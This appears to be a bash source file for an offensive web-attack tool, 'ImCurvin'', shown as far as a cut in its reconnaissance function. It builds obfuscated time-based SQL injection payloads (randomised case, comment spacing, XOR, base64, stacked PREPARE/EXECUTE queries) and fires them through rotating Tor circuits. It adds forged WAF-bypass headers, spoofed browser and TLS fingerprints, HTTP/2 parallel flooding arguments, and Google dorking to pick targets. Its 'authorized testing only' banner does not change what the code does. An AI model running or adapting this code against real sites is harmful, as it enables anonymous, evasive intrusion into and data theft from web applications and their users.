#!/bin/bash
 
# ImCurvin' v1.2.0
# Copyright 2026 Skokoo
# Licensed under the Apache License, Version 2.0

# WIP
target_url="$1"
export DEFIANCE_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
export ROOT_LOG_FILE="$DEFIANCE_DIR/../targetDef.log"

ayamaa=$(date +%H:%M:%S)

source "$DEFIANCE_DIR/../tamper/hungry.sh"

heyoii_d_eb() {
  trap - SIGINT SIGTERM EXIT
  echo -e "\n\n\e[0;31m[\e[0m!\e[0;31m]\e[0m Interrupted. Killing all process.."
  kill 0 2>/dev/null
  exit 130
}

trap 'heyoii_d_eb' SIGINT SIGTERM

export TOR_CIRCUITS=(9050 9052 9054 9056 9058 9060)

export DEFIANCE_UA=(
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0"
"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36"
"Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/605.1.15"
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
)
# logo
print_defiance_logo(){
  echo -e "    \e[38;5;45m____        \e[38;5;39m______           \e[38;5;27m_                 \e[0m"
  echo -e "   \e[38;5;45m/  _/___ ___ \e[38;5;39m/ ____/_  _______\e[38;5;27m(_)___  ____ _    \e[0m"
  echo -e "   \e[38;5;51m/ // __ \`__ \\\\\e[38;5;45m/ /   / / / / __\e[38;5;39m_/ / __ \\\\/ __ \` /    \e[0m"
  echo -e " \e[38;5;51m_/ // / / / / \e[38;5;45m/ /___/ /_/ / /  \e[38;5;39m/ / / / / /_/ /     \e[0m"
  echo -e "\e[38;5;51m/___/_/ /_/ /_/\e[38;5;51m\\\\____/\\__,_/_/  \e[38;5;45m/_/_/ /_/\\__, /      \e[0m"
  echo -e "                                       \e[38;5;39m/____/       \e[0m"
  echo -e "\n[*] ImCurvin in the curve curing ;]"
  if termux-am >/dev/null 2>&1; then
    echo -e "\e[38;5;196m[i] SYSTEM NOTICE (TERMUX):\e[0m If you zoom in excessively and experience layout tearing, please zoom out to restore interface alignment.\e[0m"
  fi
}
# HTTP pollution, air pollution.
# Told waf that this is JSON lol.
braindamage() {
  local choice=$((RANDOM % 3))
  local cf_ray=$(cat /dev/urandom | tr -dc 'a-f0-9' | fold -w 16 | head -n 1)
  if [[ "$target_url" == *"?"* ]]; then
    case "$choice" in
      0) echo "-H Content-Type:application/json -H X-Forwarded-For:127.0.0.1 -H CF-Connecting-IP:172.67.$((RANDOM % 254 + 1)).$((RANDOM % 254 + 1)) -H CF-RAY:${cf_ray}-CGK" ;;
      1) echo "-H Content-Type:application/json -H CF-Visitor:{\"scheme\":\"https\"}" ;;
      2) echo "-H Content-Type:application/json -H X-WAF-Bypass:True -H CF-IPCountry:US -H True-Client-IP:103.21.244.$((RANDOM % 254 + 1))" ;;

    esac
  else
    case "$choice" in
      0) echo "-H Content-Type:application/json -H Authorization:Bearer $cf_ray -H X-WAF-Bypass:True -H CF-IPCountry:US" ;;
      1) echo "-H Content-Type:application/json -H X-Requested-With:XMLHttpRequest -H CF-RAY:${cf_ray}-CGK -H True-Client-IP:103.21.244.$((RANDOM % 254 + 1))" ;;
      2) echo "-H Content-Type:application/json -H Cache-Control:no-cache,no-store -H Pragma:no-cache -H X-Forwarded-For:127.0.0.1" ;;
    esac
  fi
}
# dork, goofle dorking. I mean google.
dork() {
  local ayamaa=$(date +%H:%M:%S)
  local dom="$1"
  echo -e "[\033[34m${ayamaa}\033[0m] [i] Launching Universal Google Dorking..."
  sleep 2

  local gerbang=${TOR_CIRCUITS[$RANDOM % ${#TOR_CIRCUITS[@]}]}
  
  local samaran=${DEFIANCE_UA[$RANDOM % ${#DEFIANCE_UA[@]}]}
  local q="site:${dom} (intitle:\"login\" inurl:\"login\") OR inurl:search OR inurl:api OR inurl:v1"
  local enc=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$q'''))")
  local raw=$(curl $prx -s -m 10 -A "$samaran" "https://google.com{enc}&gbv=1")

  local -a list
  while read -r line; do
    if [[ -n "$line" ]]; then
      local decoded_line=$(python3 -c "import urllib.parse; print(urllib.parse.unquote('''$line'''))")
      if [[ "$decoded_line" == *"$dom"* ]]; then list+=("$decoded_line"); fi
    fi
  done < <(echo "$raw" | grep -oP '(?<=url\?q=)[^&]*' | sort -u | head -n 10)

  if [ ${#list[@]} -eq 0 ]; then
    echo -e "[\033[34m${ayamaa}\033[0m] [\033[31m-\033[0m]\e[0m No links found on Google Index."
    return 1
  fi

  echo -e "\n[\033[34m${ayamaa}\033[0m] [\033[1;34m+\033[0m] Top ${#list[@]} Discovered Targets:"
  for i in "${!list[@]}"; do echo -e "[\e[1;34m$((i+1))\e[0m] ${list[$i]}"; done

  echo -n -e "\n\e[0;32m[?]\e[0m Select target (1-${#list[@]}) or 's' to skip: "
  read -r -n 1 sel
  echo ""

  sel=$(echo "$sel" | tr '[:upper:]' '[:lower:]')

  if [[ "$sel" =~ ^[0-9]+$ ]] && [ "$sel" -le "${#list[@]}" ] && [ "$sel" -gt 0 ]; then
    local idx=$((sel - 1))
    export target_url="${list[$idx]}"
    echo -e "\e[0;32m[+]\e[0m Locked on: \e[1;34m$target_url\e[0m"
echo -e "[\033[34m${ayamaa}\033[0m] [i] Testing connection to selected target..."

test_status=$(curl $prx -s -o /dev/null -w "%{http_code}" --max-time 10 "$target_url")

if [ "$test_status" = "000" ]; then
    echo -e "[\033[31m${ayamaa}\033[0m] [->] Selected URL connection timed out."
    exit 1
elif [ "$test_status" -lt 200 ] || [ "$test_status" -ge 400 ]; then
    echo -e "[\033[31m${ayamaa}\033[0m] [->] Target returned dead status: HTTP $test_status"
    exit 1
fi

echo -e "[\033[32m${ayamaa}\033[0m] [+] Target is alive (HTTP $test_status)."

    return 0
  else
    echo -e "[\033[31m${ayamaa}\033[0m] [x] Google Dorking skipped or invalid selection. Exiting tool."
    exit 1
  fi
}
       
    # 1st Vector func.
    vector_sqli_agressor_left() {
      while IFS='|' read -r default_path query_payload || [ -n "$query_payload" ]; do
        if [[ "$default_path" == "/" ]]; then
          default_path=""
        fi
        local random_port=${TOR_CIRCUITS[$RANDOM % ${#TOR_CIRCUITS[@]}]}
          local current_time=$(date +%H:%M:%S)         
          local proxy_flag="--socks5-hostname 127.0.0.1:$random_port --socks5-gssapi-nec --fail"         

          local base_ua="${DEFIANCE_UA[$RANDOM % ${#DEFIANCE_UA[@]}]}"
          local random_ua="$base_ua"
          local ua_salt=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)

          local target_cipher=""
          local target_tls13=""
          local rapid_reset_args="--http2 --parallel --parallel-max 50"
          local chunked_headers="-H \"Transfer-Encoding: chunked\" -H \"Content-Type: application/x-www-form-urlencoded\""
          if [[ "$base_ua" == *"Firefox"* ]]; then

            random_ua="${base_ua} Gecko/20100101 Firefox/$((RANDOM % 5 + 125)).0"
            target_cipher="TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305"
            target_tls13="TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384"

          elif [[ "$base_ua" == *"iPhone"* ]]; then

            random_ua="${base_ua} Mobile/15E148 Safari/604.1"
            target_cipher="ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384"
            target_tls13="TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256"
          else
            random_ua="${base_ua} Chrome/$((RANDOM % 10 + 125)).0.$((RANDOM % 999 + 1000)).$((RANDOM % 99)) Safari/537.36"
            target_cipher="ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305"
            target_tls13="TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256"
          fi
          local defiance_tamper_path=""
          local final_query=""
          local raw_payload="$query_payload"
          local t2=$(randomcase_engine "$raw_payload")
          local t4=$(space2comment_engine "$t2")
          local hex_xor=$(xor_engine "$t4")
          local b64_payload=$(base64_engine "$hex_xor")
          defiance_tamper_path="'; SET @s=FROM_BASE64('${b64_payload}'); PREPARE stmt FROM @s; EXECUTE stmt;--"

          if [[ "$WORDLIST_MYSQL" == *"nonphp"* || "$WORDLIST_MYSQL" == *"HAHA"* ]]; then
            final_query="${default_path}${defiance_tamper_path}"
          else
            if [[ "$defiance_tamper_path" == *"="* ]]; then
              local param_name=$(echo "$defiance_tamper_path" | cut -d'=' -f1)
              local param_val=$(echo "$defiance_tamper_path" | cut -d'=' -f2-)
              final_query="${default_path}${param_name}=999&${param_name}=${param_val}${query_payload}"
            else
              final_query="${default_path}${defiance_tamper_path}"
            fi
          fi

          local waf_trick=$(braindamage)
          local clean_target_url="${target_url%%\?*}"
          local active_payload=""
          if echo "$server_fingerprint" | grep -qEi "(php|PHPSESSID|apache|litespeed)" || [[ "$target_url" == *"testphp"* ]]; then
            active_payload="$t4"
          else
            active_payload="$defiance_tamper_path"
          fi
          local current_method="${REQ_METHOD:-POST}"

          if [[ "$payloadsi" = "true" ]]; then
            output_text="[\033[34m${current_time}\033[0m] [\e[0;34m<\e[0m] Vector 1 [${current_method}][PORT:$random_port] Param: $TARGET_PARAM \033[38;5;238m[Len: ${active_payload}]\033[0m"
          else
            local technique_name="Generic Time-Based"
            case "${raw_payload}" in
              *"benchmark"*)
                technique_name="Time-Based (Heavy Benchmark)"
              ;;
              *"randomblob"*)
                technique_name="Time-Based (CPU-Exhaustion Blob)"
              ;;
              *"extractvalue"*|*"updatesxml"*)
                technique_name="Time-Based (XML Function Nested)"
              ;;
              *"json_keys"*)
                technique_name="Time-Based (JSON Object Nested)"
              ;;
              *"sleep"*)
                technique_name="Time-Based (Sub-Query Sleep)"
              ;;
            esac
            output_text="[\033[34m${current_time}\033[0m] [i] Attempting \033[1m${technique_name}\033[0m injection technique (Vector 1 & 2)."
          fi
          echo -e "$output_text"
          if [ "$REQ_METHOD" = "POST" ]; then

            curl_output=$(echo -n "${TARGET_PARAM}=999&${TARGET_PARAM}=${defiance_tamper_path}" | \
              curl $proxy_flag $cookie_flag $waf_trick $rapid_reset_args $chunked_headers \
              --tlsv1.3 --ciphers "$target_cipher" --tls13-ciphers "$target_tls13" \
              -m 12 -A "$random_ua" -s -o /dev/null -d @- \
              -w "%{time_total}|%{http_code}" \
              "${target_url}${default_path}")
          else
            curl_output=$(curl $proxy_flag $cookie_flag $waf_trick $rapid_reset_args $chunked_headers \
              --tlsv1.3 --ciphers "$target_cipher" --tls13-ciphers "$target_tls13" \
              -m 12 -A "$random_ua" -s -o /dev/null \
              -w "%{time_total}|%{http_code}" \
              "${clean_target_url}${default_path}?${TARGET_PARAM}=${active_payload}")
          fi
          local stopwatch=$(echo "$curl_output" | cut -d'|' -f1)
          local http_status=$(echo "$curl_output" | cut -d'|' -f2)

          if [[ "$http_status" == "403" || "$http_status" == "429" ]]; then
            echo -e "[\033[34m${current_time}\033[0m] [\033[1;34m!\033[0m] Port $random_port Shadowbanned [HTTP $http_status]. Rotating TOR IP Circuit..."
            (echo "AUTHENTICATE \"\""; echo "SIGNAL NEWNYM"; echo "QUIT") | nc 127.0.0.1 9051 >/dev/null 2>&1
            sleep 1
          fi          
if [[ -n "$stopwatch" && "$stopwatch" != "0" && "$stopwatch" != "0.0" && "$stopwatch" != "0.000000" ]]; then
    if command -v bc >/dev/null 2>&1; then
      is_gt=$(echo "$stopwatch >= 4.0" | bc -l 2>/dev/null || echo 0)
      if [[ "$is_gt" -eq 1 ]]; then
        echo -e "[$current_time] [×] Vector 1 confirmed MySQL Anomaly: ${stopwatch}s"
        ( flock -x 9; echo "SQLI_ALERT|$default_path|$query_payload" >&9 ) 9>>"$ROOT_LOG_FILE"
      fi
    else
      if awk -v sw="$stopwatch" 'BEGIN {exit !(sw >= 4.0)}'; then
        echo -e "[$current_time] [×] Vector 1 confirmed MySQL Anomaly: ${stopwatch}s"
        ( flock -x 9; echo "SQLI_ALERT|$default_path|$query_payload" >&9 ) 9>>"$ROOT_LOG_FILE"
      fi
    fi
fi
          sleep $((RANDOM % 6 + 4))
        done < <(shuf "$WORDLIST_MYSQL")
      }
      vector_sqli_agressor_right() {
        while IFS='|' read -r default_path query_payload || [ -n "$query_payload" ]; do
          if [[ "$default_path" == "/" ]]; then
            default_path=""
          fi

          local random_port=${TOR_CIRCUITS[$RANDOM % ${#TOR_CIRCUITS[@]}]}
            local current_time=$(date +%H:%M:%S)           
            local proxy_flag="--socks5-hostname 127.0.0.1:$random_port --socks5-gssapi-nec --fail"            

            local base_ua="${DEFIANCE_UA[$RANDOM % ${#DEFIANCE_UA[@]}]}"
            local random_ua="$base_ua"
            local ua_salt=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
            local target_cipher=""
            local target_tls13=""
            local rapid_reset_args="--http2 --parallel --parallel-max 50"
            local chunked_headers="-H \"Transfer-Encoding: chunked\" -H \"Content-Type: application/x-www-form-urlencoded\""
            if [[ "$base_ua" == *"Firefox"* ]]; then

              random_ua="${base_ua} Gecko/20100101 Firefox/$((RANDOM % 5 + 125)).0"
              target_cipher="TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305"
              target_tls13="TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384"

            elif [[ "$base_ua" == *"iPhone"* ]]; then

              random_ua="${base_ua} Mobile/15E148 Safari/604.1"
              target_cipher="ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384"
              target_tls13="TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256"

            else

              random_ua="${base_ua} Chrome/$((RANDOM % 10 + 125)).0.$((RANDOM % 999 + 1000)).$((RANDOM % 99)) Safari/537.36"
              target_cipher="ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305"
              target_tls13="TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256"
            fi
            local defiance_tamper_path=""
            local final_query=""
            local raw_payload="$query_payload"
            local t2=$(randomcase_engine "$raw_payload")
            local t4=$(space2comment_engine "$t2")
            local hex_xor=$(xor_engine "$t4")
            local b64_payload=$(base64_engine "$hex_xor")
            defiance_tamper_path="'; SET @s=FROM_BASE64('${b64_payload}'); PREPARE stmt FROM @s; EXECUTE stmt;--"

            if [[ "$WORDLIST_MYSQL" == *"nonphp"* || "$WORDLIST_MYSQL" == *"HAHA"* ]]; then
              final_query="${default_path}${defiance_tamper_path}"
            else
              if [[ "$defiance_tamper_path" == *"="* ]]; then
                local param_name=$(echo "$defiance_tamper_path" | cut -d'=' -f1)
                local param_val=$(echo "$defiance_tamper_path" | cut -d'=' -f2-)
                final_query="${default_path}${param_name}=999&${param_name}=${param_val}${query_payload}"
              else
                final_query="${default_path}${defiance_tamper_path}"
              fi
            fi
            local waf_trick=$(braindamage)
            local clean_target_url="${target_url%%\?*}"
            if echo "$server_fingerprint" | grep -qEi "(php|PHPSESSID|apache|litespeed)" || [[ "$target_url" == *"testphp"* ]]; then
              active_payload="$t4"
            else
              active_payload="$defiance_tamper_path"
            fi
            local current_method="${REQ_METHOD:-POST}"

            if [[ "$payloadsi" = "true" ]]; then
              output_text="[\033[34m${current_time}\033[0m] [\e[0;34m<\e[0m] Vector 2 [${current_method}][PORT:$random_port] Param: $TARGET_PARAM \033[38;5;238m[Len: ${active_payload}]\033[0m"
              echo -e "$output_text"
            fi

            if [ "$REQ_METHOD" = "POST" ]; then
              curl_output=$(echo -n "${TARGET_PARAM}=999&${TARGET_PARAM}=${defiance_tamper_path}" | \
                curl $proxy_flag $cookie_flag $waf_trick $rapid_reset_args $chunked_headers \
                --tlsv1.3 --ciphers "$target_cipher" --tls13-ciphers "$target_tls13" \
                -m 12 -A "$random_ua" -s -o /dev/null -d @- \
                -w "%{time_total}|%{http_code}" \
                "${target_url}${default_path}")
            else
              curl_output=$(curl $proxy_flag $cookie_flag $waf_trick $rapid_reset_args $chunked_headers \
                --tlsv1.3 --ciphers "$target_cipher" --tls13-ciphers "$target_tls13" \
                -m 12 -A "$random_ua" -s -o /dev/null \
                -w "%{time_total}|%{http_code}" \
                "${clean_target_url}${default_path}?${TARGET_PARAM}=${active_payload}")
            fi
            local stopwatch=$(echo "$curl_output" | cut -d'|' -f1)
            local http_status=$(echo "$curl_output" | cut -d'|' -f2)

            if [[ "$http_status" == "403" || "$http_status" == "429" ]]; then
              echo -e "[\033[34m${current_time}\033[0m] [\033[1;34m!\033[0m] Port $random_port Shadowbanned [HTTP $http_status]. Rotating TOR IP Circuit..."
              (echo "AUTHENTICATE \"\""; echo "SIGNAL NEWNYM"; echo "QUIT") | nc 127.0.0.1 9051 >/dev/null 2>&1
              sleep 1
            fi

            if [[ -n "$stopwatch" && "$stopwatch" != "0" && "$stopwatch" != "0.0" && "$stopwatch" != "0.000000" ]]; then    
    if command -v bc >/dev/null 2>&1; then
      is_gt=$(echo "$stopwatch >= 4.0" | bc -l 2>/dev/null || echo 0)
      if [[ "$is_gt" -eq 1 ]]; then
        echo -e "[$current_time] [×] Vector 1 confirmed MySQL Anomaly: ${stopwatch}s"        
        ( flock -x 9; echo "SQLI_ALERT|$default_path|$query_payload" >&9 ) 9>>"$ROOT_LOG_FILE"
      fi
    else      
      if awk -v sw="$stopwatch" 'BEGIN {exit !(sw >= 4.0)}'; then
        echo -e "[$current_time] [×] Vector 1 confirmed MySQL Anomaly: ${stopwatch}s"
        ( flock -x 9; echo "SQLI_ALERT|$default_path|$query_payload" >&9 ) 9>>"$ROOT_LOG_FILE"
      fi
    fi
fi
            sleep $((RANDOM % 6 + 4))
          done < <(shuf "$WORDLIST_MYSQL")
        }

        reconi() {
          local current_time=$(date +%H:%M:%S)
          echo -e "\n[\033[34mWARNING\033[0m] ImCurvin is designed for \033[1mauthorized security testing and educational purposes only.\033[0m"

          echo -e "Running this tool against targets without priorwritten consent is strictly illegal. \033[1mThe developer assumes no liability and not responsible for any misuse, damage, or system instability caused by this software.\033[0m By executing this script, you agree to these terms.\n"
          echo -e "[\033[34m${current_time}\033[0m] [i] Initiating Rapid Environmental Reconnaissance on $target_url..."
if ! command -v whois &> /dev/null; then
          echo -e "\e[0;33m[\e[0m-\e[0;37m]\e[0m WARNING: 'whois' is not installed on your terminal."
          echo -e "\e[0;33m[\e[0m-\e[0;37m]\e[0m Please install whois first before running imCurvin'."
          exit 1
        fi
          echo -e "[\033[34m${current_time}\033[0m] [i] Network locked to static proxy configuration [Port: 9050] for instant evaluation.\n"

          local static_proxy="--socks5-hostname 127.0.0.1:9050"         

          local clean_domain=$(echo "$target_url" | awk -F/ '{print $3}' | cut -d':' -f1)

          if ! curl $static_proxy -m 3 -s -I "https://torproject.org" > /dev/null; then
            echo -e "[\033[34m${current_time}\033[0m] \e[0;31m[!]\e[0m SOCKS5 Proxy \033[90moffline.\033[0m Execution aborted."
            exit 1
          fi

          local raw_headers=$(curl $static_proxy -m 5 -s -I "$target_url" | tr -d '\r')

          local http_status=$(echo "$raw_headers" | grep -Ei "^HTTP/" | head -n 1 | awk '{print $2, $3}')
          local srv_info=$(echo "$raw_headers" | grep -Ei "^Server:" | awk -F': ' '{print $2}')
          local pwd_info=$(echo "$raw_headers" | grep -Ei "^X-Powered-By:" | awk -F': ' '{print $2}')
          local waf_info=$(echo "$raw_headers" | grep -Ei "(WAF|X-DDoS|Cloudflare|Sucuri|Incapsula|Akamai|FortiWeb|AWSALB)" | head -n 1)
          local hsts_info=$(echo "$raw_headers" | grep -Ei "^Strict-Transport-Security:")

          local x_frame=$(echo "$raw_headers" | grep -Ei "^X-Frame-Options:" | awk -F': ' '{print $2}')
          local x_content=$(echo "$raw_headers" | grep -Ei "^X-Content-Type-Options:" | awk -F': ' '{print $2}')
          local x_xss=$(echo "$raw_headers" | grep -Ei "^X-XSS-Protection:" | awk -F': ' '{print $2}')
          local csp_info=$(echo "$raw_headers" | grep -Ei "^Content-Security-Policy:" | head -n 1 | cut -c1-50)
          local perm_policy=$(echo "$raw_headers" | grep -Ei "^Permissions-Policy:" | head -n 1)
          local ref_policy=$(echo "$raw_headers" | grep -Ei "^Referrer-Policy:" | awk -F': ' '{print $2}')

          local cache_ctrl=$(echo "$raw_headers" | grep -Ei "^Cache-Control:" | awk -F': ' '{print $2}')
          local content_enc=$(echo "$raw_headers" | grep -Ei "^Content-Encoding:" | awk -F': ' '{print $2}')
          local content_type=$(echo "$raw_headers" | grep -Ei "^Content-Type:" | awk -F': ' '{print $2}')
          local conn_status=$(echo "$raw_headers" | grep -Ei "^Connection:" | awk -F': ' '{print $2}')

          local cookie_raw=$(echo "$raw_headers" | grep -Ei "^Set-Cookie:")
          local cookie_sec=$([ -n "$cookie_raw" ] && echo "$cookie_raw" | grep -qi "Secure" && echo "Yes" || echo "No")
          local cookie_httponly=$([ -n "$cookie_raw" ] && echo "$cookie_raw" | grep -qi "HttpOnly" && echo "Yes" || echo "No")
          local cookie_samesite=$(echo "$cookie_raw" | grep -oEi "SameSite=[a-zA-Z]+" | head -n 1 | awk -F'=' '{print $2}')

          local tor_ip=$(curl $static_proxy -m 5 -s https://torproject.org | grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' | head -n 1)
          local target_ip=$(curl $static_proxy -m 5 -s -w "%{remote_ip}" -o /dev/null "$target_url")
          local http_version=$(curl $static_proxy -m 5 -s -o /dev/null -w "%{http_version}" "$target_url")
          local ssl_cipher=$(curl $static_proxy -m 5 -s -o /dev/null -w "%{ssl_verify_result}" "$target_url")

          echo -e "[\033[34m${current_time}\033[0m] \e[0;32m[=]\e[0m Reconnaissance Intelligence Report Consolidated:"

          if [ -n "$tor_ip" ]; then
            echo -e "[\033[34m${current_time}\033[0m] \e[0;32m[+]\e[0m 1. Outbound Gateway Proxy  : \e[0;32m${tor_ip}\e[0m"
          else
            echo -e "[\033[34m${current_time}\033[0m] \e[0;32m[+]\e[0m 1. Outbound Gateway Proxy  : \033[90m[Offline]\033[0m"
          fi

          if [ -n "$target_ip" ]; then
            echo -e "[\033[34m${current_time}\033[0m] \e[0;32m[+]\e[0m 2. Target Host Resolved IP : \e[0;32m${target_ip}\e[0m"
          else
            echo -e "[\033[34m${current_time}\033[0m] \e[0;32m[+]\e[0m 2. Target Host Resolved IP : \033[90m[Failed]\033[0m"
          fi

          if [ -n "$http_status" ]; then
            echo -e "[\033[34m${current_time}\033[0m] \e[0;32m[+]\e[0m 3. HTTP Response Status    : \e[0;32m${http_status}\e[0m"
          else
            echo -e "[\033[34m${current_time}\033[0m] \e[0;32m[+]\e[0m 3. HTTP Response Status    : \033[90m[No Response]\033[0m"
          fi

          if [ -n "$srv_info" ]; then
            echo -e "[\033[34m${current_time}\033[0m] \e[0;32m[+]\e[0m 4. Remote Web Server       : \e[0;32m${srv_info}\e[0m"
          else
            echo -e "[\033[34m${current_time}\033[0m] \e[0;32m[+]\e[0m 4. Remote Web Server       : \033[90m[Hidden/Not Detected]\033[0m"
          fi

          if [ -n "$pwd_info" ]; then
            echo -e "[\033[34m${current_time}\033[0m] \e[0;32m[+]\e[0m 5. Backend Infrastructure  : \e[0;32m${pwd_info}\e[0m"
          else
            echo -e "[\033[34m${current_time}\033[0m] \e[0;32m[+]\e[0m 5. Backend Infrastructure  : \033[90m[Hidden/Not Detected]\033[0m"
          fi

          if [ -n "$waf_info" ]; then
            echo -e "[\033[34m${current_time}\033[0m] \e[0;31m[!]\e[0m 6. Active Security Firewall: \e[0;31m${waf_info}\e[0m"
          else
            echo -e "[\033[34m${current_time}\033[0m] \e[0;32m[+]\e[0m 6. Active Security Firewall: \033[90m[No enterprise WAF detected]\033[0m"
          fi

          if [ -n "$http_version" ] && [ "$http_version" != "Unknown" ]; then
            echo -e "[\033[34m${current_time}\033[0m] \e[0;32m[+]\e[0m 7. HTTP Protocol Version   : \e[0;32mHTTP/${http_version}\e[0m"
          else
            echo -e "[\033[34m${current_time}\033[0m] \e[0;32m[+]\e[0m 7. HTTP Protocol Version   : \033[90m[Unknown]\033[0m"
          fi

          if [ -n "$ssl_cipher" ] && [ "$ssl_cipher" != "Unknown" ]; then
            echo -e "[\033[34m${current_time}\033[0m] \e[0;32m[+]\e[0m 8. SSL Verification Code   : \e[0;32m${ssl_cipher}\e[0m"
          else
            echo -e "[\033[34m${current_time}\033[0m] \e[0;32m[+]\e[0m 8. SSL Verification Code   : \033[90m[Unknown]\033[0m"
          fi

          echo -e "[\033[34m${current_time}\033[0m] \e[0;32m[+]\e[0m 9. HSTS Enforcement        : $([ -n "$hsts_info" ] && echo -e "\033[32mEnabled\033[0m" || echo -e "\033[90m[Disabled / Missing]\033[0m")"
          echo -e "[\033[34m${current_time}\033[0m] \e[0;32m[+]\e[0m 10. X-Frame-Options        : $([ -n "$x_frame" ] && echo -e "\e[0;32m${x_frame}\e[0m" || echo -e "\033[90m[Missing / Clickjacking Risk]\033[0m")"
          echo -e "[\033[34m${current_time}\033[0m] \e[0;32m[+]\e[0m 11. X-Content-Type-Options : $([ -n "$x_content" ] && echo -e "\e[0;32m${x_content}\e[0m" || echo -e "\033[90m[Missing / Mime-Sniffing Risk]\033[0m")"
          echo -e "[\033[34m${current_time}\033[0m] \e[0;32m[+]\e[0m 12. X-XSS-Protection        : $([ -n "$x_xss" ] && echo -e "\e[0;32m${x_xss}\e[0m" || echo -e "\033[90m[Missing or Legacy]\033[0m")"
          echo -e "[\033[34m${current_time}\033[0m] \e[0;32m[+]\e[0m 13. Content Security Policy : $([ -n "$csp_info" ] && echo -e "\e[0;32m${csp_info}...\e[0m" || echo -e "\033[90m[Missing / High Risk]\033[0m")"
          echo -e "[\033[34m${current_time}\033[0m] \e[0;32m[+]\e[0m 14. Permissions-Policy      : $([ -n "$perm_policy" ] && echo -e "\033[32mConfigured\033[0m" || echo -e "\033[90m[Not Found]\033[0m")"
          echo -e "[\033[34m${current_time}\033[0m] \e[0;32m[+]\e[0m 15. Referrer-Policy         : $([ -n "$ref_policy" ] && echo -e "\e[0;32m${ref_policy}\e[0m" || echo -e "\033[90m[Not Detected]\033[0m")"

          echo -e "[\033[34m${current_time}\033[0m] \e[0;32m[+]\e[0m 16. Cache-Control Directive : $([ -n "$cache_ctrl" ] && echo -e "\e[0;32m${cache_ctrl}\e[0m" || echo -e "\033[90m[No Cache Headers]\033[0m")"
          echo -e "[\033[34m${current_time}\033[0m] \e[0;32m[+]\e[0m 17. Content-Encoding        : $([ -n "$content_enc" ] && echo -e "\e[0;32m${content_enc}\e[0m" || echo -e "\033[90m[Uncompressed / Plaintext]\033[0m")"
          echo -e "[\033[34m${current_time}\033[0m] \e[0;32m[+]\e[0m 18. Target Content-Type     : $([ -n "$content_type" ] && echo -e "\e[0;32m${content_type}\e[0m" || echo -e "\033[90m[Unknown]\033[0m")"
          echo -e "[\033[34m${current_time}\033[0m] \e[0;32m[+]\e[0m 19. HTTP Connection State   : $([ -n "$conn_status" ] && echo -e "\e[0;32m${conn_status}\e[0m" || echo -e "\033[90m[Unknown]\033[0m")"

          echo -e "[\033[34m${current_time}\033[0m] \e[0;32m[+]\e[0m 20. Session Cookie Security : \033[32m[Secure: ${cookie_sec} | HttpOnly: ${cookie_httponly}]\033[0m \033[90m| SameSite: ${cookie_samesite:-None}\033[0m"

          echo -e "\n[\033[34m$(date +%H:%M:%S)\033[0m] [i] Auditing HTTP Methods (10 Parallel Requests)..."
          local methods=("GET" "POST" "PUT" "DELETE" "OPTIONS" "HEAD" "TRACE" "CONNECT" "PATCH" "PROPFIND")

          for method in "${methods[@]}"; do
            (
            local m_code=$(curl $static_proxy -m 4 -s -o /dev/null -w "%{http_code}" -X "$method" "$target_url")
            if [[ "$m_code" != "000" ]]; then
